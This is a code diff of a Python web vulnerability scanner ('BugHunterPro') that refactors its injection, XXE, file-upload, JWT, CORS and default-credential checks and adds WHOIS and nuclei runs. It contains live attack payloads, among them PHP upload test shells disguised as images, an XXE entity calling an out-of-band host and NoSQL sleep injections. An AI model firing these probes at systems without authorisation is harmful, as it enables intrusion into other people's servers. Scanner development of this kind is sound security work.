-                                    "message": f"CSRF token may not be validated at {action_url}",
-                                    "evidence": {
-                                        "form_action": action_url,
-                                        "token_name": token_input.get('name')},
-                                    "score": 70,
-                                    "timestamp": _get_full_timestamp()})
-                            self.total_score += 70
+                            self._add_finding("high", f"CSRF token may not be validated at {action_url}", {"form_action": action_url, "token_name": token_input.get('name')}, action_url, module="CSRF")
         self.log(
             "info",
             f"CSRF check completed. Found {
@@ -2027,7 +1972,7 @@ class BugHunterPro:
         if not idor_payloads:
             self.log("warn", "No IDOR payloads found, using default")
             idor_payloads = self.get_payloads("IDOR")
-        for url in tqdm(self.visited_urls, desc="Testing IDOR",
+        for url in tqdm(self.visited_urls, desc="Testing IDOR", disable=self.silent,
                         file=sys.stdout, ascii=True):
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
@@ -2037,7 +1982,7 @@ class BugHunterPro:
             for param in params:
                 original_value = params[param][0] if isinstance(
                     params[param], list) and params[param] else ""
-                baseline_response = self._make_request(url)
+                baseline_response = self._safe_request("GET", url)
                 baseline_len = len(
                     baseline_response.text) if baseline_response else -1
                 for payload in idor_payloads:
@@ -2049,21 +1994,10 @@ class BugHunterPro:
                         parsed._replace(
                             query=urlencode(
                                 test_params, True)))
-                    response = self._make_request(test_url)
-                    if response and response.status_code == 200 and baseline_len > 0 and abs(
-                            len(response.text) - baseline_len) < (baseline_len * 0.1):
-                        self.findings.append({
-                            "severity": "high",
-                            "message": f"Potential IDOR vulnerability at {test_url}",
-                            "evidence": {"payload": payload, "param": param, "baseline_len": baseline_len, "response_len": len(response.text)},
-                            "score": 70,
-                            "timestamp": _get_full_timestamp()
-                        })
-                        self.total_score += 70
-                        self.log(
-                            "warn",
-                            f"Potential IDOR at {test_url} (param: {param})",
-                            severity="high")
+                    response = self._safe_request("GET", test_url)
+                    self.tested_payload_urls.add(test_url)
+                    if response and response.status_code == 200 and baseline_len > 0 and abs(len(response.text) - baseline_len) < (baseline_len * 0.1):
+                        self._add_finding("high", "Potential IDOR vulnerability", {"param": param, "proof": f"Response length ({len(response.text)}) is similar to baseline ({baseline_len})."}, test_url, module="IDOR", payload=payload)
         self.log(
             "info",
             f"IDOR check completed. Found {
@@ -2079,7 +2013,8 @@ class BugHunterPro:
                 list(
                     self.visited_urls)}")
         api_paths = self.config.get("SETTINGS", {}).get("API_PATHS", [])
-        api_paths.extend(list(self.discovered_api_endpoints))
+        api_paths.extend(list(self.discovered_api_endpoints)
+                         )
         api_paths = sorted(list(set(api_paths)))
         findings_count = len(self.findings)
         sensitive_keys = [
@@ -2091,7 +2026,8 @@ class BugHunterPro:
 
         def check_api_path(path):
             test_url = urljoin(self.base_url, path)
-            response = self._make_request(test_url, timeout=5)
+            response = self._safe_request("GET",
+                                          test_url, timeout=5)
             if response and response.status_code == 200 and "application/json" in response.headers.get(
                     "Content-Type", ""):
                 try:
@@ -2099,18 +2035,7 @@ class BugHunterPro:
                     leaked_keys = self._find_sensitive_keys_in_json(
                         data, sensitive_keys)
                     if leaked_keys:
-                        with threading.Lock():
-                            self.findings.append({
-                                "severity": "high",
-                                "message": f"Potential API data leakage at {test_url}",
-                                "evidence": {"endpoint": test_url, "leaked_keys": list(leaked_keys)},
-                                "score": 70,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 70
-                            self.log(
-                                "warn", f"Potential API data leakage at {test_url} (keys: {
-                                    ', '.join(leaked_keys)})", severity="high")
+                        self._add_finding("high", f"Potential API data leakage at {test_url}", {"endpoint": test_url, "leaked_keys": list(leaked_keys)}, test_url, module="API Leakage")
                 except json.JSONDecodeError:
                     pass
 
@@ -2171,13 +2096,15 @@ class BugHunterPro:
                 continue
             param_to_test = list(params.keys())[0]
             block_test_params = params.copy()
+
             block_test_params[param_to_test] = "<script>alert('waf_test')</script>"
             block_test_url = urlunparse(
                 parsed._replace(
                     query=urlencode(
                         block_test_params,
                         True)))
-            block_response = self._make_request(block_test_url)
+            self.tested_payload_urls.add(block_test_url)
+            block_response = self._safe_request("GET", block_test_url)
             if not block_response or block_response.status_code == 200:
                 self.log(
                     "info",
@@ -2193,15 +2120,23 @@ class BugHunterPro:
                     parsed._replace(
                         query=urlencode(
                             test_params, True)))
-                response = self._make_request(test_url)
+                response = self._safe_request("GET", test_url)
+                self.tested_payload_urls.add(test_url)
                 if response and response.status_code != block_response.status_code:
-                    self.findings.append({
-                        "severity": "medium",
-                        "message": f"Potential WAF bypass at {test_url}",
-                        "evidence": {"payload": payload, "param": param_to_test, "waf_status": block_response.status_code, "bypass_status": response.status_code},
-                        "score": 50,
-                        "timestamp": _get_full_timestamp()
-                    })
+                    self.findings.append(
+                        {
+                            "severity": "medium",
+                            "module": "WAF Bypass",
+                            "message": "Potential WAF bypass",
+                            "url": test_url,
+                            "payload": payload,
+                            "evidence": {
+                                "param": param_to_test,
+                                "proof": f"Bypassed WAF (status {
+                                    block_response.status_code}) with status {
+                                    response.status_code}."},
+                            "score": 50,
+                            "timestamp": _get_full_timestamp()})
                     self.total_score += 50
                     self.log(
                         "warn",
@@ -2231,8 +2166,11 @@ class BugHunterPro:
                     self.visited_urls)}")
         findings_count = len(self.findings)
         for url in tqdm(
-                self.visited_urls, desc="Finding upload forms", file=sys.stdout, ascii=True):
-            response = self._make_request(url)
+                self.visited_urls,
+                desc="Finding upload forms",
+                file=sys.stdout,
+                ascii=True):
+            response = self._safe_request("GET", url)
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
@@ -2241,6 +2179,7 @@ class BugHunterPro:
                     response and 'text/html' in response.headers.get('Content-Type', '')):
                 continue
             soup = BeautifulSoup(response.text, 'html.parser')
+
             forms = soup.find_all('form', {'enctype': 'multipart/form-data'})
             for form in forms:
                 file_input = form.find('input', {'type': 'file'})
@@ -2257,42 +2196,35 @@ class BugHunterPro:
                         random.choices(
                             '0123456789',
                             k=8))}"
+
                 shell_content = f"<?php echo '{unique_marker}'; ?>"
                 payloads = {
-                    "shell.php": ("application/x-php", shell_content.encode('utf-8')),
-                    "shell.php.jpg": ("image/jpeg", shell_content.encode('utf-8')),
-                    "shell.gif": ("image/gif", b"GIF89a;" + shell_content.encode('utf-8'))
-                }
+                    "shell.php": (
+                        "application/x-php",
+                        shell_content.encode('utf-8')),
+                    "shell.php.jpg": (
+                        "image/jpeg",
+                        shell_content.encode('utf-8')),
+                    "shell.gif": (
+                        "image/gif",
+                        b"GIF89a;" +
+                        shell_content.encode('utf-8'))}
                 for filename, (content_type, content) in payloads.items():
                     files = {
                         file_param_name: (
                             filename,
                             content,
                             content_type)}
-                    upload_response = self._make_request(
-                        upload_url, method="POST", files=files)
+                    upload_response = self._safe_request("POST",
+                                                         upload_url, files=files)
                     if upload_response and upload_response.status_code == 200:
                         for upload_path in ["/uploads/",
                                             "/files/", "/images/", ""]:
                             verify_url = urljoin(
                                 self.base_url, upload_path + filename)
-                            verify_response = self._make_request(verify_url)
+                            verify_response = self._safe_request("GET", verify_url)
                             if verify_response and unique_marker in verify_response.text:
-                                self.findings.append(
-                                    {
-                                        "severity": "critical",
-                                        "message": f"Verified file upload vulnerability at {upload_url}",
-                                        "evidence": {
-                                            "upload_url": upload_url,
-                                            "file_url": verify_url,
-                                            "filename": filename},
-                                        "score": 95,
-                                        "timestamp": _get_full_timestamp()})
-                                self.total_score += 95
-                                self.log(
-                                    "warn",
-                                    f"Verified file upload execution at {verify_url}",
-                                    severity="critical")
+                                self._add_finding("critical", f"Verified file upload vulnerability at {upload_url}", {"upload_url": upload_url, "file_url": verify_url, "filename": filename}, upload_url, module="File Upload", payload=filename)
                                 break
         self.log(
             "info",
@@ -2328,26 +2260,17 @@ class BugHunterPro:
                 dynamic_payload = crlf_payloads[0].replace(
                     "Gemini:Injected", f"{unique_header_name}: {unique_header_value}")
                 test_params = params.copy()
+
                 test_params[param] = dynamic_payload
                 test_url = urlunparse(
                     parsed._replace(
                         query=urlencode(
                             test_params, True)))
-                response = self._make_request(test_url)
+                self.tested_payload_urls.add(test_url)
+                response = self._safe_request("GET", test_url)
                 if response and response.headers.get(
                         unique_header_name) == unique_header_value:
-                    self.findings.append({
-                        "severity": "medium",
-                        "message": f"Potential CRLF injection at {test_url}",
-                        "evidence": {"payload": dynamic_payload, "param": param, "reflected_header": f"{unique_header_name}: {unique_header_value}"},
-                        "score": 40,
-                        "timestamp": _get_full_timestamp()
-                    })
-                    self.total_score += 40
-                    self.log(
-                        "warn",
-                        f"Potential CRLF injection at {test_url} (param: {param})",
-                        severity="medium")
+                    self._add_finding("medium", "Potential CRLF injection", {"param": param, "proof": f"Injected header reflected in response: {unique_header_name}: {unique_header_value}"}, test_url, module="CRLF Injection", payload=dynamic_payload)
                     break
         self.log(
             "info",
@@ -2366,14 +2289,18 @@ class BugHunterPro:
         cmd_payloads = self.get_payloads("COMMAND_INJECTION")
         findings_count = len(self.findings)
         for url in tqdm(
-                self.visited_urls, desc="Testing command injection", file=sys.stdout, ascii=True):
+                self.visited_urls,
+                desc="Testing command injection",
+                file=sys.stdout,
+                ascii=True):
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
                 continue
             params = parse_qs(parsed.query)
             for param in params:
-                baseline_response = self._make_request(url)
+                baseline_response = self._safe_request("GET", url)
+
                 baseline_text = baseline_response.text if baseline_response else ""
                 for payload_template in cmd_payloads:
                     unique_marker = ''.join(
@@ -2382,9 +2309,11 @@ class BugHunterPro:
                     payload = payload_template.replace(
                         "{{MARKER}}", unique_marker)
                     test_params = params.copy()
+
                     test_params[param] = f"original_value{payload}"
                     test_url_payload = urlunparse(parsed._replace(
                         query=urlencode(test_params, doseq=True)))
+                    self.tested_payload_urls.add(test_url_payload)
                     if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower(
                     ) or "ping -c" in payload.lower() or "ping -n" in payload.lower():
                         baseline_params_time = params.copy()
@@ -2395,12 +2324,13 @@ class BugHunterPro:
                                     baseline_params_time,
                                     doseq=True)))
                         start_time_base = time.time()
-                        self._make_request(baseline_url_time, timeout=10)
+                        self._safe_request("GET", baseline_url_time, timeout=10)
                         end_time_base = time.time()
                         base_duration = end_time_base - start_time_base
                         start_time_payload = time.time()
                         try:
-                            self._make_request(test_url_payload, timeout=15)
+                            self._safe_request("GET",
+                                               test_url_payload, timeout=15)
                         except requests.exceptions.Timeout:
                             pass
                         except Exception:
@@ -2408,47 +2338,26 @@ class BugHunterPro:
                         end_time_payload = time.time()
                         payload_duration = end_time_payload - start_time_payload
                         if payload_duration > (base_duration + 4.5):
-                            self.findings.append({
-                                "severity": "critical",
-                                "message": f"Potential OS command injection (time-based) at {test_url_payload}",
-                                "evidence": {"payload": payload, "delay": f"{payload_duration:.2f}s", "baseline": f"{base_duration:.2f}s", "param": param},
-                                "score": 90,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 90
-                            self.log(
-                                "warn",
-                                f"Potential OS command injection (time-based) at {test_url_payload} (param: {param})",
-                                severity="critical")
+                            self._add_finding("critical", "Potential OS command injection (time-based)", {"payload": payload, "delay": f"{payload_duration:.2f}s", "baseline": f"{base_duration:.2f}s", "param": param}, test_url_payload, module="Command Injection", payload=payload)
                             continue
-                    response = self._make_request(test_url_payload)
+                    response = self._safe_request("GET", test_url_payload)
                     if response and unique_marker in response.text and unique_marker not in baseline_text:
                         output_patterns = {
-                            "id": ["uid=", "gid=", "groups="],
-                            "whoami": ["root", "daemon", "nt authority\\system", "administrator"],
-                            "hostname": [self.host.split('.')[0]],
-                            "ver": ["microsoft windows", "version"],
-                            "win.ini": ["for 16-bit app support", "[fonts]"]
-                        }
+                            "id": [
+                                "uid=", "gid=", "groups="],
+                            "whoami": ["root", "daemon", "nt authority\\system", "administrator"], "hostname": [
+                                self.host.split('.')[0]], "ver": [
+                                "microsoft windows", "version"], "win.ini": [
+                                "for 16-bit app support", "[fonts]"]}
                         is_output_vulnerable = False
-                        for cmd_keyword, patterns in output_patterns.items():
+                        for cmd_keyword, patterns in output_patterns.items(
+                        ):
                             if cmd_keyword in payload.lower() and any(p.lower() in response.text.lower()
                                                                       for p in patterns):
                                 is_output_vulnerable = True
                                 break
                         if is_output_vulnerable:
-                            self.findings.append({
-                                "severity": "critical",
-                                "message": f"Potential OS command injection (output-based) at {test_url_payload}",
-                                "evidence": {"payload": payload, "reflected_marker": unique_marker, "param": param, "response_sample": response.text[:200]},
-                                "score": 90,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 90
-                            self.log(
-                                "warn",
-                                f"Potential OS command injection (output-based) at {test_url_payload} (param: {param})",
-                                severity="critical")
+                            self._add_finding("critical", "Potential OS command injection (output-based)", {"payload": payload, "reflected_marker": unique_marker, "param": param, "response_sample": response.text[:200]}, test_url_payload, module="Command Injection", payload=payload)
                             continue
         self.log(
             "info",
@@ -2464,6 +2373,7 @@ class BugHunterPro:
         oast_domain = self.get_payloads("OAST").get(
             "INTERACTSH_DOMAIN", "oast.me").split(',')[0]
         findings_count = len(self.findings)
+
         xml_template = '<?xml version="1.0"?><!DOCTYPE root [{} ]><root></root>'
         for url in tqdm(self.visited_urls, desc="Testing XXE",
                         file=sys.stdout, ascii=True):
@@ -2471,8 +2381,17 @@ class BugHunterPro:
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
                 continue
-            if any(url.endswith(ext) for ext in [
-                   '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.woff', '.woff2']):
+            if any(
+                url.endswith(ext) for ext in [
+                    '.css',
+                    '.js',
+                    '.png',
+                    '.jpg',
+                    '.jpeg',
+                    '.gif',
+                    '.svg',
+                    '.woff',
+                    '.woff2']):
                 continue
 
             unique_subdomain = f"xxe-{
@@ -2481,21 +2400,23 @@ class BugHunterPro:
                         'abcdef0123456789',
                         k=10))}"
             oast_payload_str = f'<!ENTITY % xxe SYSTEM "http://{unique_subdomain}.{oast_domain}"> %xxe;'
-            xml_data_oast = xml_template.format(oast_payload_str)
+            xml_data_oast = xml_template.format(
+                oast_payload_str)
             headers = {'Content-Type': 'application/xml'}
-            self._make_request(
-                url,
-                method='POST',
-                data=xml_data_oast,
-                headers=headers,
-                timeout=5)
+            self.tested_payload_urls.add(url)
+            self._safe_request("POST",
+                               url,
+                               data=xml_data_oast,
+                               headers=headers,
+                               timeout=5)
+
             self.log(
                 "info",
                 f"Sent XXE OAST payload to {url}. Check Interactsh for interactions with {unique_subdomain}.{oast_domain}")
             for payload in xxe_payloads:
                 xml_data = xml_template.format(payload)
-                response = self._make_request(
-                    url, method='POST', data=xml_data, headers=headers)
+                response = self._safe_request("POST",
+                                              url, data=xml_data, headers=headers)
                 if not response:
                     continue
                 is_vulnerable = False
@@ -2504,19 +2425,7 @@ class BugHunterPro:
                 elif "file://" in payload and response.status_code == 200 and len(response.text) > 50:
                     is_vulnerable = True
                 if is_vulnerable:
-                    self.findings.append({
-                        "severity": "high",
-                        "message": f"Potential XXE (In-Band) vulnerability at {url}",
-                        "evidence": {"payload": payload, "xml_data": xml_data[:150], "response_sample": response.text[:200]},
-                        "score": 90,
-                        "timestamp": _get_full_timestamp()
-                    })
-                    self.total_score += 90
-                    self.log(
-                        "warn",
-                        f"Potential XXE (In-Band) at {url}",
-                        severity="high")
-                    break
+                    self._add_finding("high", "Potential XXE (In-Band) vulnerability", {"proof": "Server response indicates successful entity processing.", "xml_data": xml_data[:150], "response_sample": response.text[:200]}, url, module="XXE", payload=payload)
         self.log(
             "info", f"XXE check completed. Found {len(self.findings) - findings_count} new findings")
 
@@ -2540,6 +2449,7 @@ class BugHunterPro:
                 continue
             params = parse_qs(parsed.query)
             for param in params:
+
                 time_payload = '{"$where": "sleep(5000)"}'
                 test_params_time = params.copy()
                 test_params_time[param] = time_payload
@@ -2548,12 +2458,13 @@ class BugHunterPro:
                         query=urlencode(
                             test_params_time,
                             True)))
+                self.tested_payload_urls.add(test_url_time)
                 start_time_base = time.time()
-                self._make_request(url, timeout=10)
+                self._safe_request("GET", url, timeout=10)
                 base_duration = time.time() - start_time_base
                 start_time_payload = time.time()
                 try:
-                    self._make_request(test_url_time, timeout=10)
+                    self._safe_request("GET", test_url_time, timeout=10)
                 except requests.exceptions.Timeout:
                     pass
                 duration = time.time() - start_time_payload
@@ -2562,19 +2473,9 @@ class BugHunterPro:
                         "warn",
                         f"Potential time-based NoSQLi at {test_url_time}",
                         severity="high")
-                    self.findings.append(
-                        {
-                            "severity": "high",
-                            "message": f"Potential time-based NoSQL Injection at {test_url_time}",
-                            "evidence": {
-                                "payload": time_payload,
-                                "param": param,
-                                "delay": f"{
-                                    duration:.2f}s"},
-                            "score": 80,
-                            "timestamp": _get_full_timestamp()})
-                    self.total_score += 80
+                    self._add_finding("high", "Potential time-based NoSQL Injection", {"param": param, "proof": f"Response delayed by {duration:.2f}s."}, test_url_time, module="NoSQL Injection", payload=time_payload)
                     continue
+
                 true_payload = '{"$ne": "gemini_non_existent_string"}'
                 false_payload = '{"$eq": "gemini_non_existent_string"}'
                 params_true = params.copy()
@@ -2583,35 +2484,25 @@ class BugHunterPro:
                     parsed._replace(
                         query=urlencode(
                             params_true, True)))
-                resp_true = self._make_request(url_true)
+                self.tested_payload_urls.add(url_true)
+                resp_true = self._safe_request("GET", url_true)
                 params_false = params.copy()
                 params_false[param] = false_payload
                 url_false = urlunparse(
                     parsed._replace(
                         query=urlencode(
                             params_false, True)))
-                resp_false = self._make_request(url_false)
+                self.tested_payload_urls.add(url_false)
+                resp_false = self._safe_request("GET", url_false)
                 if resp_true and resp_false and resp_true.status_code == 200 and resp_false.status_code == 200:
-                    if len(resp_true.text) != len(resp_false.text):
+                    if len(
+                            resp_true.text) != len(
+                            resp_false.text):
                         self.log(
                             "warn",
                             f"Potential boolean-based NoSQLi at {url} (param: {param})",
                             severity="high")
-                        self.findings.append(
-                            {
-                                "severity": "high",
-                                "message": f"Potential boolean-based NoSQL Injection at {url}",
-                                "evidence": {
-                                    "param": param,
-                                    "true_payload": true_payload,
-                                    "false_payload": false_payload,
-                                    "true_len": len(
-                                        resp_true.text),
-                                    "false_len": len(
-                                        resp_false.text)},
-                                "score": 75,
-                                "timestamp": _get_full_timestamp()})
-                        self.total_score += 75
+                        self._add_finding("high", "Potential boolean-based NoSQL Injection", {"param": param, "proof": f"True ({len(resp_true.text)} bytes) and False ({len(resp_false.text)} bytes) responses differ."}, url, module="NoSQL Injection", payload=true_payload)
         self.log(
             "info",
             f"NoSQL Injection check completed. Found {
@@ -2636,8 +2527,9 @@ class BugHunterPro:
                     continue
                 for method in ['GET', 'OPTIONS']:
                     headers = {"Origin": origin_payload}
-                    response = self._make_request(
-                        url, method=method, headers=headers)
+                    self.tested_payload_urls.add(url)
+                    response = self._safe_request(method,
+                                                  url, headers=headers)
                     if response:
                         allow_origin = response.headers.get(
                             'Access-Control-Allow-Origin', '')
@@ -2651,17 +2543,7 @@ class BugHunterPro:
                                 severity = "critical"
                                 message = f"Critical CORS misconfiguration (credentials allowed) at {url} for origin '{origin_payload}'"
                                 score = 90
-                            self.findings.append({
-                                "severity": severity, "message": message,
-                                "evidence": {"allow_origin": allow_origin, "allow_credentials": allow_creds, "tested_origin": origin_payload, "method": method},
-                                "score": score, "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += score
-                            self.log(
-                                "warn",
-                                f"CORS misconfig at {url}: {allow_origin} (creds: {allow_creds})",
-                                severity=severity)
-                            break
+                            self._add_finding(severity, message, {"proof": f"Origin '{allow_origin}' is allowed with credentials: {allow_creds}.", "method": method}, url, module="CORS", payload=origin_payload)
         self.log(
             "info",
             f"CORS check completed. Found {
@@ -2684,36 +2566,30 @@ class BugHunterPro:
         graphql_endpoints = self.config.get(
             "SETTINGS", {}).get(
             "API_PATHS", [])
+
         graphql_endpoints = [
             p for p in graphql_endpoints if 'graphql' in p or 'graphiql' in p]
         graphql_endpoints.extend(["/graphql", "/api", "/query"])
         graphql_endpoints = sorted(list(set(graphql_endpoints)))
         for endpoint in tqdm(
-                graphql_endpoints, desc="Testing GraphQL", file=sys.stdout, ascii=True):
+                graphql_endpoints,
+                desc="Testing GraphQL",
+                file=sys.stdout,
+                ascii=True):
             test_url = urljoin(self.target, endpoint)
             for payload in graphql_payloads:
                 methods_to_test = {
+
                     "POST": {"headers": {'Content-Type': 'application/json'}, "data": payload},
                     "GET": {"params": {"query": payload}}
                 }
                 for method, kwargs in methods_to_test.items():
-                    response = self._make_request(
-                        test_url, method=method, **kwargs)
+                    response = self._safe_request(method,
+                                                  test_url, **kwargs)
+                    self.tested_payload_urls.add(test_url)
                     try:
                         if response and response.json().get("data", {}).get("__schema"):
-                            self.findings.append({
-                                "severity": "medium",
-                                "message": f"GraphQL introspection enabled at {test_url} (via {method})",
-                                "evidence": {"endpoint": test_url, "method": method, "response_sample": response.text[:250]},
-                                "score": 40,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 40
-                            self.log(
-                                "warn",
-                                f"GraphQL introspection enabled at {test_url} (via {method})",
-                                severity="medium")
-                            break
+                            self._add_finding("medium", "GraphQL introspection enabled", {"method": method, "proof": "Introspection query returned schema data.", "response_sample": response.text[:250]}, test_url, module="GraphQL", payload=payload)
                     except (json.JSONDecodeError, AttributeError):
                         continue
         self.log(
@@ -2735,30 +2611,24 @@ class BugHunterPro:
         if not default_creds:
             self.log("warn", "No default creds payloads found, using default")
             default_creds = self.get_payloads("DEFAULT_CREDS")
-        login_endpoints = ["/login", "/admin", "/auth"]
+        login_endpoints = ["/login", "/admin",
+                           "/auth"]
         for endpoint in tqdm(
-                login_endpoints, desc="Testing default creds", file=sys.stdout, ascii=True):
+                login_endpoints,
+                desc="Testing default creds",
+                file=sys.stdout,
+                ascii=True):
             test_url = urljoin(self.target, endpoint)
             for cred in default_creds:
                 data = {
                     "username": cred["username"],
                     "password": cred["password"]}
-                response = self._make_request(
-                    test_url, method='POST', data=data)
+                response = self._safe_request("POST",
+                                              test_url, data=data)
+                self.tested_payload_urls.add(test_url)
                 if response and ("welcome" in response.text.lower()
-                                 or response.status_code == 302):
-                    self.findings.append({
-                        "severity": "critical",
-                        "message": f"Default credentials working at {test_url}",
-                        "evidence": {"creds": cred},
-                        "score": 90,
-                        "timestamp": _get_full_timestamp()
-                    })
-                    self.total_score += 90
-                    self.log(
-                        "warn",
-                        f"Default creds at {test_url}: {cred}",
-                        severity="critical")
+                                 or (response.is_redirect and response.headers.get("Location") != test_url and "login" not in response.headers.get("Location", ""))):
+                    self._add_finding("critical", "Default credentials may be working", {"proof": "Login attempt resulted in a redirect or welcome message."}, test_url, module="Default Credentials", payload=str(cred))
         self.log(
             "info",
             f"Default creds check completed. Found {
@@ -2773,7 +2643,7 @@ class BugHunterPro:
         findings_count = len(self.findings)
         for url in tqdm(self.visited_urls, desc="Testing JWT",
                         file=sys.stdout, ascii=True):
-            original_response = self._make_request(url)
+            original_response = self._safe_request("GET", url)
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
@@ -2786,8 +2656,8 @@ class BugHunterPro:
                 original_token = auth_header.split(" ")[1]
                 invalid_headers = original_response.request.headers.copy()
                 del invalid_headers["Authorization"]
-                invalid_response = self._make_request(
-                    url, headers=invalid_headers)
+                invalid_response = self._safe_request("GET",
+                                                      url, headers=invalid_headers)
                 invalid_len = len(
                     invalid_response.text) if invalid_response else -1
                 valid_len = len(original_response.text)
@@ -2799,24 +2669,18 @@ class BugHunterPro:
                 for payload in jwt_payloads:
                     test_headers = original_response.request.headers.copy()
                     test_headers["Authorization"] = f"Bearer {payload}"
-                    test_response = self._make_request(
-                        url, headers=test_headers)
+                    test_response = self._safe_request("GET",
+                                                       url, headers=test_headers)
+                    self.tested_payload_urls.add(url)
                     if test_response:
-                        if abs(len(test_response.text) - valid_len) < (valid_len *
-                                                                       0.1) and len(test_response.text) != invalid_len:
-                            self.findings.append({
-                                "severity": "critical",
-                                "message": f"Potential JWT vulnerability (e.g., alg:none) at {url}",
-                                "evidence": {"payload": payload, "location": "Authorization Header"},
-                                "score": 90,
-                                "timestamp": _get_full_timestamp()
-                            })
-                            self.total_score += 90
-                            self.log(
-                                "warn",
-                                f"Potential JWT vulnerability at {url}",
-                                severity="critical")
-                            break
+                        if abs(
+                                len(
+                                    test_response.text) -
+                                valid_len) < (
+                                valid_len *
+                                0.1) and len(
+                                test_response.text) != invalid_len and invalid_len > 0:
+                            self._add_finding("critical", "Potential JWT vulnerability (e.g., alg:none)", {"location": "Authorization Header", "proof": "Request with modified JWT was accepted."}, url, module="JWT", payload=payload)
         self.log(
             "info", f"JWT check completed. Found {len(self.findings) - findings_count} new findings")
 
@@ -2831,7 +2695,10 @@ class BugHunterPro:
             "PAYLOADS", ["__proto__[is_polluted]=true"])
         findings_count = len(self.findings)
         for url in tqdm(
-                self.visited_urls, desc="Testing Prototype Pollution", file=sys.stdout, ascii=True):
+                self.visited_urls,
+                desc="Testing Prototype Pollution",
+                file=sys.stdout,
+                ascii=True):
             parsed = urlparse(url)
             if not parsed.scheme or not parsed.netloc:
                 self.log("warn", f"Skipping invalid URL: {url}")
@@ -2853,26 +2720,14 @@ class BugHunterPro:
                     parsed._replace(
                         query=urlencode(
                             test_params, True)))
-                self._make_request(pollute_url)
-                check_url = urljoin(self.base_url, f"/?check={unique_prop}")
-                check_response = self._make_request(check_url)
+                self.tested_payload_urls.add(pollute_url)
+                self._safe_request("GET", pollute_url)
+                check_url = urljoin(
+                    self.base_url,
+                    f"/?check={unique_prop}")
+                check_response = self._safe_request(check_url)
                 if check_response and unique_prop in check_response.text:
-                    self.log(
-                        "warn",
-                        f"Potential Prototype Pollution detected via {pollute_url}",
-                        severity="high")
-                    self.findings.append(
-                        {
-                            "severity": "high",
-                            "message": f"Potential Prototype Pollution detected via {pollute_url}",
-                            "evidence": {
-                                "payload": pollution_payload,
-                                "check_url": check_url,
-                                "reflected_prop": unique_prop},
-                            "score": 80,
-                            "timestamp": _get_full_timestamp()})
-                    self.total_score += 80
-                    break
+                    self._add_finding("high", "Potential Prototype Pollution detected", {"check_url": check_url, "proof": f"Polluted property '{unique_prop}' was reflected."}, pollute_url, module="Prototype Pollution", payload=pollution_payload)
         self.log(
             "info",
             f"Prototype Pollution check completed. Found {
@@ -2880,14 +2735,115 @@ class BugHunterPro:
                     self.findings) -
                 findings_count} new findings")
 
+    def run_whois(self):
+        if not WHOIS_AVAILABLE:
+            self.log(
+                "warn",
+                "python-whois is not installed. Install: pip install python-whois")
+            return
+
+        self.log("run", "Running a WHOIS lookup...")
+        try:
+            w = whois.whois(self.host)
+            details = f"""
+            Registrar: {w.registrar}
+            Creation Date: {w.creation_date}
+            Expiry Date: {w.expiry_date}
+            Name Servers: {', '.join(w.name_servers) if w.name_servers else 'N/A'}
+            Org: {w.org}
+            Country: {w.country}
+            """
+            self._add_finding("info", "WHOIS Information", details.strip(), self.target, module="WHOIS")
+            self.log("success", f"WHOIS selesai: {w.registrar}")
+        except Exception as e:
+            self.log("error", f"WHOIS gagal: {e}")
+
+    def _run_nuclei_scan(self):
+        self.log("run", "Preparing nuclei scan...")
+        nuclei_path = shutil.which("nuclei")
+        if not nuclei_path:
+            self.log(
+                "error",
+                "Nuclei tidak terinstall. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
+            return
+
+        output_file = os.path.join(self.output_dir, "nuclei_report.jsonl")
+        cmd = [
+            nuclei_path,
+            "-u", self.target,
+            "-jsonl",
+            "-o", output_file,
+            "-stats",
+            "-rl", "20",
+            "-c", "50",
+            "-timeout", "10",
+            "-retries", "2"
+        ]
+
+        username = self.extract_username(self.target)
+        if username:
+            cmd += ["-var", f"user={username}"]
+            self.log("info", f"Auto-set template var: user={username}")
+
+        cmd_str = " ".join(cmd)
+        self.log("debug", f"Executing nuclei: {cmd_str}")
+
+        try:
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+                universal_newlines=True)
+
+            def stream_output():
+                try:
+                    for line in process.stdout:
+                        if line.strip():
+                            self.log("info", line.strip())
+                except ValueError:
+                    pass
+                finally:
+                    if not process.stdout.closed:
+                        process.stdout.close()
+
+            thread = threading.Thread(target=stream_output, daemon=True)
+            thread.start()
+
+            thread.join(timeout=self.nuclei_timeout)
+
+            if thread.is_alive():
+                self.log("warn", f"Nuclei timeout ({self.nuclei_timeout // 60} menit). Membunuh proses...")
+                process.kill()
+                process.communicate()
+
+            if process.returncode == 0 and not thread.is_alive():
+                self.log("success", f"Nuclei selesai. Laporan: {output_file}")
+                self._parse_nuclei_report(output_file)
+            elif process.returncode != 0:
+                self.log("error", f"Nuclei gagal (exit code: {process.returncode})")
+
+        except subprocess.TimeoutExpired:
+            self.log(
+                "warn",
+                f"Nuclei timeout ({self.nuclei_timeout // 60} menit). Membunuh proses...")
+            process.kill()
+            process.communicate()
+        except Exception as e:
+            self.log("error", f"Nuclei error: {e}")
+
     def run_specific_module(self, module_name):
         module_map = {
             "xss": self.check_xss,
-            "sqli": lambda: (self.check_sqli_error_based(), self.check_sqli_time_based()),
+            "sqli": self.test_sql_injection,
             "ssti": self.check_ssti,
             "lfi": self.check_lfi,
             "rfi": self.check_rfi,
-            "ssrf": lambda: (self.check_ssrf(), self.check_ssrf_oast(), self.check_internal_access_via_ssrf()),
+            "ssrf": lambda: (
+                self.check_ssrf(),
+                self.check_ssrf_oast(),
+                self.check_internal_access_via_ssrf()),
             "ssrf_internal": self.check_internal_access_via_ssrf,
             "open_redirect": self.check_open_redirect,
